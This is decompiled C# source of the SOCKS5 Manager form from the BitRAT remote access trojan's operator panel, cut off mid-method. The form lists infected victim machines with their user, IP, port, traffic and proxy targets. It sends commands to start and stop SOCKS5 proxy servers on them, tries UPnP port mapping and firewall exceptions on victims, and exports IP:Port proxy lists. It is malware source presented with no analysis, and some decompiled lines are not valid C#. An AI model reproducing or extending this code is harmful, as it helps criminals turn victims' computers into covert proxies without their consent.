﻿using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fSocks5 : Form
{
    private IContainer icontainer_0;
    private Timer timer_0;
    private TextBox textBox_0;
    private Label label_0;
    private RadioButton radioButton_0;
    private RadioButton radioButton_1;
    private StatusStrip statusStrip_0;
    private ToolStripStatusLabel toolStripStatusLabel_0;
    private ToolStripStatusLabel toolStripStatusLabel_1;
    private OLVColumn olvcolumn_0;
    private OLVColumn olvcolumn_1;
    private FastObjectListView fastObjectListView_0;
    private ContextMenuStrip contextMenuStrip_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private ToolStripMenuItem toolStripMenuItem_1;
    private ToolStripSeparator toolStripSeparator_0;
    private ToolStripMenuItem toolStripMenuItem_2;
    private ToolStripMenuItem toolStripMenuItem_3;
    private ToolStripMenuItem toolStripMenuItem_4;
    private PictureBox pictureBox_0;
    private BackgroundWorker backgroundWorker_0;
    private OLVColumn olvcolumn_2;
    private OLVColumn olvcolumn_3;
    private OLVColumn olvcolumn_4;
    private OLVColumn olvcolumn_5;
    private OLVColumn olvcolumn_6;
    private OLVColumn olvcolumn_7;
    private OLVColumn olvcolumn_8;
    private PictureBox pictureBox_1;
    private CheckBox checkBox_0;
    private ToolStripMenuItem toolStripMenuItem_5;
    private ToolStripSeparator toolStripSeparator_1;
    private VisualButton visualButton_0;
    private VisualButton visualButton_1;
    private ToolStripSeparator toolStripSeparator_2;
    private ToolStripMenuItem toolStripMenuItem_6;
    public ConcurrentStack<cSocks5cli> concurrentStack_0;
    public ConcurrentStack<cSocks5cli> concurrentStack_1;
    public ConcurrentStack<cSocks5cli> concurrentStack_2;

    public fSocks5()
    {
        base.Load += new EventHandler(this.fSocks5_Load);
        base.Closing += new CancelEventHandler(this.fSocks5_Closing);
        this.concurrentStack_0 = new ConcurrentStack<cSocks5cli>();
        this.concurrentStack_1 = new ConcurrentStack<cSocks5cli>();
        this.concurrentStack_2 = new ConcurrentStack<cSocks5cli>();
        this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fSocks5_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    private void fSocks5_Load(object sender, EventArgs e)
    {
        this.vmethod_20().VirtualMode = true;
        this.vmethod_20().set_View(View.Details);
        this.vmethod_20().FullRowSelect = true;
        this.vmethod_20().set_OwnerDraw(true);
        this.vmethod_20().get_Columns()[0].Width = 180;
        this.vmethod_20().get_Columns()[1].Width = 100;
        this.vmethod_20().get_Columns()[2].Width = 50;
        this.vmethod_20().get_Columns()[3].Width = 80;
        this.vmethod_20().get_Columns()[4].Width = 80;
        this.vmethod_20().get_Columns()[5].Width = 80;
        this.vmethod_20().get_Columns()[6].Width = 80;
        this.vmethod_20().get_Columns()[7].Width = 120;
        this.vmethod_20().get_Columns()[8].Width = 80;
        this.vmethod_20().GridLines = Class135.smethod_0().Gridlines;
        this.vmethod_38().RunWorkerAsync();
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_1(new Timer(this.icontainer_0));
        this.vmethod_3(new TextBox());
        this.vmethod_5(new Label());
        this.vmethod_7(new RadioButton());
        this.vmethod_9(new RadioButton());
        this.vmethod_11(new StatusStrip());
        this.vmethod_13(new ToolStripStatusLabel());
        this.vmethod_15(new ToolStripStatusLabel());
        this.vmethod_17(new OLVColumn());
        this.vmethod_19(new OLVColumn());
        this.vmethod_21(new FastObjectListView());
        this.vmethod_41(new OLVColumn());
        this.vmethod_45(new OLVColumn());
        this.vmethod_47(new OLVColumn());
        this.vmethod_49(new OLVColumn());
        this.vmethod_51(new OLVColumn());
        this.vmethod_53(new OLVColumn());
        this.vmethod_43(new OLVColumn());
        this.vmethod_23(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_25(new ToolStripMenuItem());
        this.vmethod_27(new ToolStripMenuItem());
        this.vmethod_67(new ToolStripSeparator());
        this.vmethod_69(new ToolStripMenuItem());
        this.vmethod_29(new ToolStripSeparator());
        this.vmethod_31(new ToolStripMenuItem());
        this.vmethod_59(new ToolStripMenuItem());
        this.vmethod_61(new ToolStripSeparator());
        this.vmethod_33(new ToolStripMenuItem());
        this.vmethod_35(new ToolStripMenuItem());
        this.vmethod_37(new PictureBox());
        this.vmethod_39(new BackgroundWorker());
        this.vmethod_55(new PictureBox());
        this.vmethod_57(new CheckBox());
        this.vmethod_63(new VisualButton());
        this.vmethod_65(new VisualButton());
        this.vmethod_10().SuspendLayout();
        this.vmethod_20().BeginInit();
        this.vmethod_22().SuspendLayout();
        ((ISupportInitialize) this.vmethod_36()).BeginInit();
        ((ISupportInitialize) this.vmethod_54()).BeginInit();
        base.SuspendLayout();
        this.vmethod_0().Enabled = true;
        this.vmethod_0().Interval = 0x3e8;
        this.vmethod_2().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_2().Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_2().ForeColor = SystemColors.WindowText;
        this.vmethod_2().Location = new Point(0xb2, 0x13b);
        this.vmethod_2().Margin = new Padding(2);
        this.vmethod_2().MaxLength = 5;
        this.vmethod_2().Name = "txtPort";
        this.vmethod_2().Size = new Size(0x39, 20);
        this.vmethod_2().TabIndex = 0x58;
        this.vmethod_2().Text = "1080";
        this.vmethod_4().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_4().BackColor = Color.Transparent;
        this.vmethod_4().Location = new Point(0x8e, 0x13e);
        this.vmethod_4().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_4().Name = "lblPort";
        this.vmethod_4().Size = new Size(0x20, 13);
        this.vmethod_4().TabIndex = 0x57;
        this.vmethod_4().Text = "Port:";
        this.vmethod_4().TextAlign = ContentAlignment.TopRight;
        this.vmethod_6().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_6().AutoSize = true;
        this.vmethod_6().BackColor = Color.Transparent;
        this.vmethod_6().Location = new Point(0x2e1, 0x13c);
        this.vmethod_6().Margin = new Padding(2);
        this.vmethod_6().Name = "rbSelected";
        this.vmethod_6().Size = new Size(0x7a, 0x11);
        this.vmethod_6().TabIndex = 0x56;
        this.vmethod_6().Text = "Only selected clients";
        this.vmethod_6().UseVisualStyleBackColor = false;
        this.vmethod_8().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_8().AutoSize = true;
        this.vmethod_8().BackColor = Color.Transparent;
        this.vmethod_8().Checked = true;
        this.vmethod_8().Location = new Point(0x2b9, 0x13b);
        this.vmethod_8().Margin = new Padding(2);
        this.vmethod_8().Name = "rbAll";
        this.vmethod_8().Size = new Size(0x24, 0x11);
        this.vmethod_8().TabIndex = 0x55;
        this.vmethod_8().TabStop = true;
        this.vmethod_8().Text = "All";
        this.vmethod_8().UseVisualStyleBackColor = false;
        this.vmethod_10().AutoSize = false;
        this.vmethod_10().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_10().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] toolStripItems = new ToolStripItem[] { this.vmethod_12(), this.vmethod_14() };
        this.vmethod_10().Items.AddRange(toolStripItems);
        this.vmethod_10().Location = new Point(0, 0x156);
        this.vmethod_10().Name = "ssTransferStatus";
        this.vmethod_10().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_10().Size = new Size(0x375, 0x13);
        this.vmethod_10().SizingGrip = false;
        this.vmethod_10().Stretch = false;
        this.vmethod_10().TabIndex = 0x52;
        this.vmethod_10().Text = "stStatus";
        this.vmethod_12().AutoSize = false;
        this.vmethod_12().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_12().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_12().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_12().Name = "tsSocks5Count";
        this.vmethod_12().Size = new Size(140, 0x10);
        this.vmethod_12().Text = "Socks5 servers: 0";
        this.vmethod_12().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_14().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_14().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_14().Margin = new Padding(0, 3, -4, 0);
        this.vmethod_14().Name = "tsClientsSelected";
        this.vmethod_14().Size = new Size(0x2e5, 0x10);
        this.vmethod_14().Spring = true;
        this.vmethod_14().Text = "Selected clients: 0";
        this.vmethod_14().TextAlign = ContentAlignment.MiddleRight;
        this.vmethod_16().set_AspectName("IP");
        this.vmethod_16().set_Hideable(false);
        this.vmethod_16().Text = "IP";
        this.vmethod_18().set_AspectName("USER");
        this.vmethod_18().set_Hideable(false);
        this.vmethod_18().Text = "User";
        this.vmethod_20().Alignment = ListViewAlignment.Left;
        this.vmethod_20().get_AllColumns().Add(this.vmethod_18());
        this.vmethod_20().get_AllColumns().Add(this.vmethod_16());
        this.vmethod_20().get_AllColumns().Add(this.vmethod_40());
        this.vmethod_20().get_AllColumns().Add(this.vmethod_44());
        this.vmethod_20().get_AllColumns().Add(this.vmethod_46());
        this.vmethod_20().get_AllColumns().Add(this.vmethod_48());
        this.vmethod_20().get_AllColumns().Add(this.vmethod_50());
        this.vmethod_20().get_AllColumns().Add(this.vmethod_52());
        this.vmethod_20().get_AllColumns().Add(this.vmethod_42());
        this.vmethod_20().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_20().AutoArrange = false;
        this.vmethod_20().BorderStyle = BorderStyle.None;
        this.vmethod_20().set_CellEditUseWholeCell(false);
        ColumnHeader[] values = new ColumnHeader[9];
        values[0] = this.vmethod_18();
        values[1] = this.vmethod_16();
        values[2] = this.vmethod_40();
        values[3] = this.vmethod_44();
        values[4] = this.vmethod_46();
        values[5] = this.vmethod_48();
        values[6] = this.vmethod_50();
        values[7] = this.vmethod_52();
        values[8] = this.vmethod_42();
        this.vmethod_20().get_Columns().AddRange(values);
        this.vmethod_20().ContextMenuStrip = this.vmethod_22();
        this.vmethod_20().Cursor = Cursors.Default;
        this.vmethod_20().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_20().FullRowSelect = true;
        this.vmethod_20().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_20().HideSelection = false;
        this.vmethod_20().Location = new Point(0, 0);
        this.vmethod_20().Margin = new Padding(1);
        this.vmethod_20().Name = "lvSocks5Servers";
        this.vmethod_20().set_ShowGroups(false);
        this.vmethod_20().Size = new Size(0x375, 0x132);
        this.vmethod_20().TabIndex = 0x51;
        this.vmethod_20().UseCompatibleStateImageBehavior = false;
        this.vmethod_20().set_UseHotControls(false);
        this.vmethod_20().set_UseOverlays(false);
        this.vmethod_20().set_View(View.Details);
        this.vmethod_20().VirtualMode = true;
        this.vmethod_40().set_AspectName("PORT");
        this.vmethod_40().set_Hideable(false);
        this.vmethod_40().Text = "Port";
        this.vmethod_44().set_AspectName("SENT");
        this.vmethod_44().set_Hideable(false);
        this.vmethod_44().Text = "Sent";
        this.vmethod_46().set_AspectName("RECV");
        this.vmethod_46().set_Hideable(false);
        this.vmethod_46().Text = "Received";
        this.vmethod_48().set_AspectName("SPEED_DL");
        this.vmethod_48().set_Hideable(false);
        this.vmethod_48().Text = "DL";
        this.vmethod_50().set_AspectName("SPEED_UL");
        this.vmethod_50().set_Hideable(false);
        this.vmethod_50().Text = "UL";
        this.vmethod_52().set_AspectName("TARGET");
        this.vmethod_52().set_Hideable(false);
        this.vmethod_52().Text = "Target";
        this.vmethod_42().set_AspectName("DURATION");
        this.vmethod_42().set_Hideable(false);
        this.vmethod_42().Text = "Duration";
        this.vmethod_22().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray2 = new ToolStripItem[] { this.vmethod_24(), this.vmethod_28(), this.vmethod_30() };
        this.vmethod_22().Items.AddRange(itemArray2);
        this.vmethod_22().Name = "ContextMenuStrip1";
        this.vmethod_22().Size = new Size(170, 0x36);
        ToolStripItem[] itemArray3 = new ToolStripItem[] { this.vmethod_26(), this.vmethod_66(), this.vmethod_68() };
        this.vmethod_24().DropDownItems.AddRange(itemArray3);
        this.vmethod_24().Name = "OperationsToolStripMenuItem";
        this.vmethod_24().Size = new Size(0xa9, 0x16);
        this.vmethod_24().Text = "Operations";
        this.vmethod_26().Name = "StopToolStripMenuItem";
        this.vmethod_26().Size = new Size(150, 0x16);
        this.vmethod_26().Text = "Stop";
        this.vmethod_66().Name = "ToolStripMenuItem3";
        this.vmethod_66().Size = new Size(0x93, 6);
        this.vmethod_68().Name = "ResetStatisticsToolStripMenuItem";
        this.vmethod_68().Size = new Size(150, 0x16);
        this.vmethod_68().Text = "Reset statistics";
        this.vmethod_28().Name = "ToolStripMenuItem2";
        this.vmethod_28().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray4 = new ToolStripItem[] { this.vmethod_58(), this.vmethod_60(), this.vmethod_32(), this.vmethod_34() };
        this.vmethod_30().DropDownItems.AddRange(itemArray4);
        this.vmethod_30().Name = "CopyToClipboardToolStripMenuItem";
        this.vmethod_30().Size = new Size(0xa9, 0x16);
        this.vmethod_30().Text = "Copy to clipboard";
        this.vmethod_58().Name = "IPPortToolStripMenuItem";
        this.vmethod_58().Size = new Size(0x76, 0x16);
        this.vmethod_58().Text = "IP:Port";
        this.vmethod_60().Name = "ToolStripMenuItem1";
        this.vmethod_60().Size = new Size(0x73, 6);
        this.vmethod_32().Name = "SelectedToolStripMenuItem";
        this.vmethod_32().Size = new Size(0x76, 0x16);
        this.vmethod_32().Text = "Selected";
        this.vmethod_34().Name = "AllToolStripMenuItem";
        this.vmethod_34().Size = new Size(0x76, 0x16);
        this.vmethod_34().Text = "All";
        this.vmethod_36().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_36().Image = Class131.smethod_24();
        this.vmethod_36().Location = new Point(0x35f, 0x13d);
        this.vmethod_36().Margin = new Padding(2);
        this.vmethod_36().Name = "pbInfo";
        this.vmethod_36().Size = new Size(15, 15);
        this.vmethod_36().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_36().TabIndex = 0x59;
        this.vmethod_36().TabStop = false;
        this.vmethod_54().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_54().Image = Class131.smethod_24();
        this.vmethod_54().Location = new Point(0x133, 0x13d);
        this.vmethod_54().Margin = new Padding(2);
        this.vmethod_54().Name = "pbInfoRandom";
        this.vmethod_54().Size = new Size(15, 15);
        this.vmethod_54().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_54().TabIndex = 0x5b;
        this.vmethod_54().TabStop = false;
        this.vmethod_56().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_56().AutoSize = true;
        this.vmethod_56().BackColor = Color.Transparent;
        this.vmethod_56().Location = new Point(0xee, 0x13d);
        this.vmethod_56().Margin = new Padding(1);
        this.vmethod_56().Name = "chkRandom";
        this.vmethod_56().RightToLeft = RightToLeft.Yes;
        this.vmethod_56().Size = new Size(0x42, 0x11);
        this.vmethod_56().TabIndex = 90;
        this.vmethod_56().Text = "Random";
        this.vmethod_56().UseVisualStyleBackColor = false;
        this.vmethod_62().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_62().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_62().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_62().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_62().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_62().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_62().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_62().Border.HoverVisible = true;
        this.vmethod_62().Border.Rounding = 6;
        this.vmethod_62().Border.Thickness = 1;
        this.vmethod_62().Border.Type = ShapeTypes.Rounded;
        this.vmethod_62().Border.Visible = true;
        this.vmethod_62().DialogResult = DialogResult.None;
        this.vmethod_62().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_62().Image = null;
        this.vmethod_62().Location = new Point(10, 310);
        this.vmethod_62().MouseState = MouseStates.Normal;
        this.vmethod_62().Name = "btnStart";
        this.vmethod_62().Size = new Size(0x3d, 30);
        this.vmethod_62().TabIndex = 0x5c;
        this.vmethod_62().Text = "Start";
        this.vmethod_62().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_62().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_62().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_62().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_62().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_62().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_62().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_62().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_64().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_64().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_64().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_64().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_64().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_64().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_64().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_64().Border.HoverVisible = true;
        this.vmethod_64().Border.Rounding = 6;
        this.vmethod_64().Border.Thickness = 1;
        this.vmethod_64().Border.Type = ShapeTypes.Rounded;
        this.vmethod_64().Border.Visible = true;
        this.vmethod_64().DialogResult = DialogResult.None;
        this.vmethod_64().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_64().Image = null;
        this.vmethod_64().Location = new Point(0x4c, 310);
        this.vmethod_64().MouseState = MouseStates.Normal;
        this.vmethod_64().Name = "btnStop";
        this.vmethod_64().Size = new Size(0x3d, 30);
        this.vmethod_64().TabIndex = 0x5d;
        this.vmethod_64().Text = "Stop";
        this.vmethod_64().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_64().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_64().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_64().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_64().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_64().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_64().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_64().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        base.ClientSize = new Size(0x375, 0x169);
        base.Controls.Add(this.vmethod_64());
        base.Controls.Add(this.vmethod_62());
        base.Controls.Add(this.vmethod_54());
        base.Controls.Add(this.vmethod_56());
        base.Controls.Add(this.vmethod_36());
        base.Controls.Add(this.vmethod_2());
        base.Controls.Add(this.vmethod_4());
        base.Controls.Add(this.vmethod_6());
        base.Controls.Add(this.vmethod_8());
        base.Controls.Add(this.vmethod_10());
        base.Controls.Add(this.vmethod_20());
        this.DoubleBuffered = true;
        base.Name = "fSocks5";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        base.StartPosition = FormStartPosition.CenterParent;
        this.Text = "SOCKS5 Manager";
        this.vmethod_10().ResumeLayout(false);
        this.vmethod_10().PerformLayout();
        this.vmethod_20().EndInit();
        this.vmethod_22().ResumeLayout(false);
        ((ISupportInitialize) this.vmethod_36()).EndInit();
        ((ISupportInitialize) this.vmethod_54()).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }

    public void method_0()
    {
        base.Left = (int) Math.Round((double) ((Class130.fMain_0.Left + (((double) Class130.fMain_0.Width) / 2.0)) - (((double) base.Width) / 2.0)));
        base.Top = (int) Math.Round((double) ((Class130.fMain_0.Top + (((double) Class130.fMain_0.Height) / 2.0)) - (((double) base.Height) / 2.0)));
    }

    public void method_1(string string_0, string string_1, string string_2, string string_3)
    {
        if (this.vmethod_20().InvokeRequired)
        {
            object[] args = new object[] { string_0, string_1, string_2, string_3 };
            this.vmethod_20().Invoke(new Delegate99(this.method_1), args);
        }
        else if (!Class130.concurrentDictionary_6.ContainsKey(string_0))
        {
            cSocks5cli sockscli = new cSocks5cli();
            sockscli.IP = string_2;
            sockscli.USER = string_1;
            sockscli.Key = string_0;
            sockscli.PORT = string_3;
            sockscli.DURATION = Class136.smethod_35(0L, true);
            sockscli.bJustConnected = true;
            if (Conversion.Val(string_3) == 0.0)
            {
                sockscli.pending_dc = true;
            }
            Class130.concurrentDictionary_6.TryAdd(string_0, sockscli);
            Class130.concurrentDictionary_6[string_0].Key = string_0;
            this.concurrentStack_0.Push(sockscli);
        }
    }

    public void method_10()
    {
        if (this.vmethod_20().InvokeRequired)
        {
            this.vmethod_20().Invoke(new Delegate95(this.method_10), new object[0]);
        }
        else if (this.concurrentStack_1.Count > 0)
        {
            this.vmethod_20().RefreshObjects(Enumerable.ToList<cSocks5cli>(this.concurrentStack_1));
            this.concurrentStack_1.Clear();
        }
    }

    public void method_11()
    {
        if (this.vmethod_20().InvokeRequired)
        {
            this.vmethod_20().Invoke(new Delegate100(this.method_11), new object[0]);
        }
        else if (this.concurrentStack_2.Count > 0)
        {
            this.vmethod_20().RemoveObjects(Enumerable.ToList<cSocks5cli>(this.concurrentStack_2));
            this.concurrentStack_2.Clear();
        }
    }

    private void method_12(object sender, DoWorkEventArgs e)
    {
        while (true)
        {
            this.method_9();
            this.method_10();
            this.method_11();
            Thread.Sleep(0x3e8);
        }
    }

    private void method_13(object sender, EventArgs e)
    {
        Interaction.MsgBox("The client will randomly pick an available port.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_14(object sender, EventArgs e)
    {
        this.vmethod_2().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_56().Checked, false, true));
    }

    private void method_15(object sender, EventArgs e)
    {
        FastObjectListView view = this.vmethod_20();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                string str = "socks5_srv_stop|1";
                string key = ((cSocks5cli) enumerator.Current).Key;
                Class136.Class138 class2 = new Class136.Class138();
                class2.string_0 = key;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        view = null;
    }

    private void method_16(object sender, MouseEventArgs e)
    {
        this.vmethod_24().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_20().get_SelectedObjects().Count > 0, true, false));
        this.vmethod_30().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_20().get_SelectedObjects().Count > 0, true, false));
    }

    private void method_17(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_20();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cSocks5cli current = (cSocks5cli) enumerator.Current;
                string[] textArray1 = new string[0x12];
                textArray1[0] = current.USER;
                textArray1[1] = "\t";
                textArray1[2] = current.IP;
                textArray1[3] = "\t";
                textArray1[4] = current.PORT;
                textArray1[5] = "\t";
                textArray1[6] = current.SENT;
                textArray1[7] = "\t";
                textArray1[8] = current.RECV;
                textArray1[9] = "\t";
                textArray1[10] = current.SPEED_DL;
                textArray1[11] = "\t";
                textArray1[12] = current.SPEED_UL;
                textArray1[13] = "\t";
                textArray1[14] = current.TARGET;
                textArray1[15] = "\t";
                textArray1[0x10] = current.DURATION;
                textArray1[0x11] = "\r\n";
                builder.Append(string.Concat(textArray1));
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_18(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        IEnumerator enumerator = this.vmethod_20().get_Objects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cSocks5cli current = (cSocks5cli) enumerator.Current;
            string[] textArray1 = new string[0x12];
            textArray1[0] = current.USER;
            textArray1[1] = "\t";
            textArray1[2] = current.IP;
            textArray1[3] = "\t";
            textArray1[4] = current.PORT;
            textArray1[5] = "\t";
            textArray1[6] = current.SENT;
            textArray1[7] = "\t";
            textArray1[8] = current.RECV;
            textArray1[9] = "\t";
            textArray1[10] = current.SPEED_DL;
            textArray1[11] = "\t";
            textArray1[12] = current.SPEED_UL;
            textArray1[13] = "\t";
            textArray1[14] = current.TARGET;
            textArray1[15] = "\t";
            textArray1[0x10] = current.DURATION;
            textArray1[0x11] = "\r\n";
            builder.Append(string.Concat(textArray1));
        }
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_19(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_20();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cSocks5cli current = (cSocks5cli) enumerator.Current;
                builder.Append(current.IP + ":" + current.PORT + "\r\n");
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    public void method_2(string string_0)
    {
        if (Class130.concurrentDictionary_6.ContainsKey(string_0))
        {
            if (this.vmethod_20().InvokeRequired)
            {
                object[] args = new object[] { string_0 };
                this.vmethod_20().Invoke(new Delegate96(this.method_2), args);
            }
            else
            {
                this.concurrentStack_2.Push(Class130.concurrentDictionary_6[string_0]);
                Class130.concurrentDictionary_6.TryRemove(string_0, out (cSocks5cli) out null);
            }
        }
    }

    private void method_20(object sender, EventArgs e)
    {
        string str;
        string sKey;
        Class136.Class138 class2;
        FastObjectListView view = Class130.fMain_0.vmethod_18();
        if (!this.vmethod_6().Checked)
        {
            IEnumerator enumerator = view.get_Objects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                str = "socks5_srv_stop|1";
                sKey = ((CClient) enumerator.Current).sKey;
                class2 = new Class136.Class138();
                class2.string_0 = sKey;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        else if (view.get_SelectedObjects() != null)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                str = "socks5_srv_stop|1";
                sKey = ((CClient) enumerator.Current).sKey;
                class2 = new Class136.Class138();
                class2.string_0 = sKey;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        view = null;
    }

    private void method_21(object sender, EventArgs e)
    {
        Interaction.MsgBox("UPnP technology will be attempted on clients for port mapping.\r\n\r\nNote: This feature requires the client to run with elevated privileges (as administrator) as an exception needs to be added with Windows Firewall.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_22(object sender, EventArgs e)
    {
        FastObjectListView view = this.vmethod_20();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cSocks5cli current = (cSocks5cli) enumerator.Current;
                current.dSent = 0.0;
                current.dRecv = 0.0;
            }
        }
        view = null;
    }

    public void method_3(string string_0, string[] string_1)
    {
        if (!Class130.concurrentDictionary_6.ContainsKey(string_0))
        {
            this.method_1(string_0, Class130.concurrentDictionary_3[string_0].sUser, Class130.concurrentDictionary_3[string_0].sIP, string_1[2]);
            this.method_3(string_0, string_1);
        }
        else if (this.vmethod_20().InvokeRequired)
        {
            object[] args = new object[] { string_0, string_1 };
            this.vmethod_20().Invoke(new Delegate97(this.method_3), args);
        }
        else
        {
            ref double numRef;
            int num3;
            Class130.concurrentDictionary_6[string_0].USER = string_1[0];
            Class130.concurrentDictionary_6[string_0].IP = string_1[1];
            Class130.concurrentDictionary_6[string_0].PORT = string_1[2];
            *(numRef = ref Class130.concurrentDictionary_6[string_0].dRecv) = numRef + Conversion.Val(string_1[4]);
            *(numRef = ref Class130.concurrentDictionary_6[string_0].dSent) = numRef + Conversion.Val(string_1[5]);
